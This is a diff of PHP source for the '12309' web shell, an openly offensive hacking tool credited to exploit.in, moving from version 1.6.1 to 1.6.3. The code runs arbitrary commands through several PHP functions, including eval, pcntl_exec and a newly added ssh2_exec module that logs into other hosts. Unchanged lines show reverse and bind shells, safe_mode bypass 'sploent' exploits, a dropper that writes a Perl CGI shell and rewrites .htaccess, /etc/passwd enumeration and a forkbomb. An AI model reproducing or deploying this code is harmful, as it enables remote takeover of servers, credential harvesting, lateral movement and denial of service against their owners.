@@ -10,15 +10,27 @@ if(isset($_GET['l0g1n'])) {
 if(!isset($_SESSION['l0g1n'])) {
  header("Location: http://".$_SERVER['SERVER_NAME']."/404.html"); //debug: maybe usr HTTP_HOST here?
 }
-$ver="1.6.1"; 
+$ver="1.6.3"; 
 // --------------------------------------------- globals 
 error_reporting(0);
-$version=phpversion();
+@set_time_limit(0);
+@ignore_user_abort(1);
+@ini_set('max_execution_time',0);
 $descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("pipe", "w")
 );
+// --------------------------------------------- clearing phpversion() 
+function version() {
+ $pv=explode(".",phpversion());
+ if(eregi("-",$pv[2])) {
+  $tmp=explode("-",$pv[2]);
+  $pv[2]=$tmp[0];
+ }
+ $php_version_sort=$pv[0].".".$pv[1].".".$pv[2];
+ return $php_version_sort;
+}
 // --------------------------------------------- recursive dir removal by Endeveit
 function rmrf($dir)
 {
@@ -187,7 +199,7 @@ function search($bin,$flag) {
 }
 // --------------------------------------------- print page 
 $title='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
-<!-- made by vk/12309 || cheerz to Tidus and Shift on BHT; pekayoba and all bros on NS || exploit.in f0r3v4 -->
+<!-- made by vk/12309 || cheerz to Tidus, Shift, pekayoba, Zer0 || exploit.in f0r3v4 -->
 <html>
  <head>
   <title>12309 '.$ver.'</title>
@@ -228,7 +240,7 @@ switch ($_GET['p']) {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s">
   <font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" maxlength="500" size="50" value="'.$shelltext.'"> <input type="submit" value="go"> <input type="checkbox" name="down"> download <br><br>';
    if ($failflag=="1") {
-    echo "all system functions are disabled :( <font color=\"gray\"> but you could try a <a href=\"?p=e\">perl shell</a> ;) and still there is<br></font>"; } else {
+    echo "all system functions are disabled :( <font color=\"gray\"> but you could try a <a href=\"?p=e\">perl shell</a> ;) and still there are<br></font>"; } else {
     if (function_enabled('passthru')) {
      echo 'passthru <input name="wut" value="passthru" type="radio" checked><br>';
     } else { echo 'passthru is disabled!<br>';}
@@ -252,20 +264,38 @@ switch ($_GET['p']) {
    echo 'php eval() <input name="wut" value="eval" type="radio"><br>';
    //echo 'SQL <input name="wut" value="sql" type="radio"><br>'; //TODO
    echo '</form>';
-    //determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?
+   echo "<br>pcntl_exec:";
+   //determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?
    if (extension_loaded('pcntl')) {
     if (function_enabled('pcntl_fork')) {
      if (function_enabled('pcntl_exec')) {
-     echo "<br>pcntl_exec:";
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
      } else {
-      echo "<br>pcntl_exec is disabled!";
+      echo "<br>pcntl_exec is disabled!<br>";
      }
     } else {
-     echo "<br>pcntl_fork is disabled!";
+     echo "<br>pcntl_fork is disabled!<br>";
     }
    } else {
-    echo "<br>no pcntl.so here";
+    echo "<br>fail, no pcntl.so here<br>";
+   }
+   echo "<br>ssh2_exec:";
+   if (extension_loaded('ssh2')) {
+    if (function_enabled('ssh2_connect')) {
+     if (function_enabled('ssh2_exec')) {
+      if ($_POST["down"] != "on") {
+       if (empty($_POST["wut"])) {
+        echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"> <font color="gray">host: <input name="ssh2host" type="text" size="20" value="localhost"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="22"> user: <input name="ssh2user" type="text" size="20" value="h4x0r"> password: <input name="ssh2pass" type="text" size="20" value="r0xx0r"> </font><br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="uname -a"> <input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
+       }
+      }
+     } else {
+      echo "<br>ssh2_exec is disabled!";
+     }
+    } else {
+     echo "<br>ssh2_connect is disabled!";
+    }
+   } else {
+    echo "<br>fail, no ssh2.so here";
    }
    echo "</body></html>";
   } else {
@@ -278,57 +308,54 @@ switch ($_GET['p']) {
    if ($_POST["down"] != "on") {
    switch ($_POST["wut"]) {
     case "passthru":
-     if ( $version <= "5.2.9" ) {
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) {
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'passthru"></form>';
      break;
     case "system":
-     if ( $version <= "5.2.9" ) {
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) {
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'system"></form>';
      break;
     case "exec":
-     if ( $version <= "5.2.9" ) {
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) {
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'exec"></form>';
      break;
     case "shell_exec":
-     if ( $version <= "5.2.9" ) {
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) {
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'shell_exec"></form>';
      break;
     case "popen":
-     if ( $version <= "5.2.9" ) {
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) {
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'popen"></form>';
      break;
     case "proc_open":
-     if ( $version <= "5.2.9" ) {
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) {
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'proc_open"></form>';
      break;
     case "eval":
-     if ( $version <= "5.2.9" ) {
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) {
       sploent516();
      }
      echo "$html"; echo 'php -r \''; echo '<input name="command" type="text" maxlength="500" size="50" value="'.htmlspecialchars($shelltext, ENT_QUOTES, "UTF-8").'"> \' <input type="submit" value="Enter">
      <input name="wut" value="eval" type="hidden"></form>';
      break;
     case "pcntl":
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
+     //sploent516 not needed coz pcntl bypasses safe_mode
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
+     break;
+    case "ssh2":
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> host: <input name="ssh2host" type="text" size="20" value="'.$_POST["ssh2host"].'"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="'.$_POST["ssh2port"].'"> user: <input name="ssh2user" type="text" size="20" value="'.$_POST["ssh2user"].'"> password: <input name="ssh2pass" type="text" size="20" value="'.$_POST["ssh2pass"].'"> </font><br><font color="green"> haxor@pwnedbox$ </font> <input name="command" type="text" size="40" value="'.$shelltext.'"> <input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
      break;
     case "sql":
      header('Location: '.$_SERVER['PHP_SELF'].'?p=ms');
@@ -402,6 +429,25 @@ switch ($_GET['p']) {
     case "eval":
      eval(stripslashes($_POST["command"]));
      break;
+    case "ssh2":
+     $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?");
+     //using knowingly wrong username to test auth. methods
+     $auth_methods = ssh2_auth_none($connection, '12309tezt');
+     if (in_array('password', $auth_methods)) {
+      $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?"); //need to connect again after failed login
+      if (ssh2_auth_password($connection, ''.$_POST["ssh2user"].'', ''.$_POST["ssh2pass"].'')) {
+       $stream=ssh2_exec($connection, $shelltext);
+       stream_set_blocking($stream, true);
+       $output=stream_get_contents($stream);
+       echo $output;
+       fclose($stream);
+      } else {
+       echo "cant login. user/pass wrong?";
+      }
+     } else {
+      echo 'fail, no "password" auth method';
+     }     
+     break;
    }
    if ($_POST["down"] != "on") {
     echo "</textarea>";
@@ -433,7 +479,7 @@ switch ($_GET['p']) {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
    <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
    //curl
-   if ( $version <= "5.2.9" ) {
+   if (strnatcmp(version(),"5.2.9") <= 0) {
     echo "<br> curl exploit: <br>";
     if (!extension_loaded('curl')) {
      echo "&nbsp;&nbsp;fail, curl is required<br>";
@@ -760,9 +806,6 @@ switch ($_GET['p']) {
    switch ($_POST["shellz"]) {
     case "phpremote":
     // code by pentestmonkey.net. license: GPLv2
-     @set_time_limit(0);
-     @ignore_user_abort(1);
-     @ini_set('max_execution_time',0);
      $ip=($_POST["ip"]);
      $port=($_POST["port"]);
      $chunk_size=1400;
@@ -811,9 +854,6 @@ switch ($_GET['p']) {
     break;
     case "phplocal":
      // code by metasploit.com. license unknown, assuming BSD
-     @set_time_limit(0); 
-     @ignore_user_abort(1); 
-     @ini_set('max_execution_time',0); 
      $port=$_POST["port"]; 
      $scl='socket_create_listen';
      if (function_enabled($scl)) {
@@ -1036,47 +1076,55 @@ switch ($_GET['p']) {
   break;
 // --------------------------------------------- bind end; extras 
  case "e":
-  echo $title;
-  echo '<font color="blue">---> SysInfo</font><br>';
-  echo '<font color="gray">httpd: '.getenv("SERVER_SOFTWARE").'<br>';
-  echo "php API: ".php_sapi_name()."<br>";
-  echo "php version: ".$version."<br>";
-  sploent516();
-  echo "<br>";
-  echo "current dir: ".getcwd()."<br>"; //TODO: use sploents to remove open_basedir here
-  echo "uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
-  echo "script owner: ".get_current_user()."<br>";
-  if(function_enabled('posix_getpwuid')) { 
-   $processUser = posix_getpwuid(posix_geteuid());
-   echo "current user: ".$processUser['name']."<br>";
-  } else {
-   echo "posix_getpwuid disabled!<br>";
-  }
-  echo "<br></font>";
-  echo '<font color="blue">---> Extraz</font><br><br>';
-  if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
-  } else {
-   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">
-    <input name="extraz" type="hidden" value="info"><input type="submit" value="phpinfo()"></form><br>';
-  }
-  if(function_enabled('posix_getpwuid')) {
-   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">"read" /etc/passwd from uid <input name="uid1" type="text" size="10" value="0"> to <input name="uid2" type="text" size="10" value="1000"> <input type="submit" value="go"><input name="uidz" type="hidden" value="done"></form>';
-   if (!empty($_POST["uidz"])) {
-    echo "<br>";
-    //code by oRb. license unknown, assuming WTFPL
-    for(;$_POST['uid1'] <= $_POST['uid2'];$_POST['uid1']++) {
-     $uid = @posix_getpwuid($_POST['uid1']);
-     if ($uid)
-      echo join(':',$uid)."<br>\n";
-     }
+  if (empty($_POST["extraz"])) {
+   echo $title; 
+   echo '<font color="blue">---> SysInfo</font><br>';
+   echo '<font color="gray">httpd: '.getenv("SERVER_SOFTWARE").'<br>';
+   echo "php API: ".php_sapi_name()."<br>";
+   echo "php version: ".version()." (full: ".phpversion().")<br>";
+   sploent516();
+   echo "<br>";
+   echo "current dir: ".getcwd()."<br>"; //TODO: use sploents to remove open_basedir here
+   echo "uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
+   echo "script owner: ".get_current_user()."<br>";
+   if(function_enabled('posix_getpwuid')) { 
+    $processUser = posix_getpwuid(posix_geteuid());
+    echo "current user: ".$processUser['name']."<br>";
+   } else {
+    echo "posix_getpwuid disabled!<br>";
    }
+   echo "<br></font>";
+   echo '<font color="blue">---> Extraz</font><br><br>';
+   if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
+   } else {
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">
+     <input name="extraz" type="hidden" value="info"><input type="submit" value="phpinfo()"></form><br>';
+   }
+   if(function_enabled('posix_getpwuid')) {
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">"read" /etc/passwd from uid <input name="uid1" type="text" size="10" value="0"> to <input name="uid2" type="text" size="10" value="1000"> <input type="submit" value="go"><input name="uidz" type="hidden" value="done"></form>';
+    if (!empty($_POST["uidz"])) {
+     echo "<br>";
+     //code by oRb. license unknown, assuming WTFPL
+     for(;$_POST['uid1'] <= $_POST['uid2'];$_POST['uid1']++) {
+      $uid = @posix_getpwuid($_POST['uid1']);
+      if ($uid)
+       echo join(':',$uid)."<br>\n";
+     }
+    }
+   }
+   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini perl shell into <input name="dir" type="text" maxlength="100" size="10" style="color: green;" value="."><font color="green">/</font><input name="file" type="text" maxlength="100" size="10" style="color: green;" value="sh.pl"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="perlsh"> ';
+   if (is_writable("./")) {
+    echo "<font color=\"green\">(./ writable)</font>";
+   } else {
+    echo "<font color=\"red\">(./ readonly)</font>";
+   }
+   echo '<br><font color="gray">warning: my .htaccess will <b>rewrite</b> current one!(if any)</font> </form>';
+   if ($failflag=="1") {
+    echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
+   }
+   echo '<br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
+   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e"><input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb"></form>';
   }
-  echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini perl shell into <input name="dir" type="text" maxlength="100" size="10" style="color: green;" value="."><font color="green">/</font><input name="file" type="text" maxlength="100" size="10" style="color: green;" value="sh.pl"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="perlsh"><br><font color="gray">warning: my .htaccess will <b>rewrite</b> current one!</font> </form>';
-  if ($failflag=="1") {
-   echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
- }
-  echo '<br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
-  echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e"><input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb"></form>';
   //
   if (!empty($_POST["extraz"])) {
    switch ($_POST["extraz"]) {
@@ -1122,8 +1170,7 @@ switch ($_GET['p']) {
       exit(0);';
      $htaccess='Options +Indexes +FollowSymLinks +ExecCGI
 AddType application/x-httpd-cgi .pl';
-     if ( $version <= "5.2.9" ) { 
-      echo "<br> trying php5.1.6 sploent...<br>:";
+     if (strnatcmp(version(),"5.2.9") <= 0) { 
       sploent516();
      }
      $fh=fopen($_POST["dir"]."/".$_POST["file"],"w");
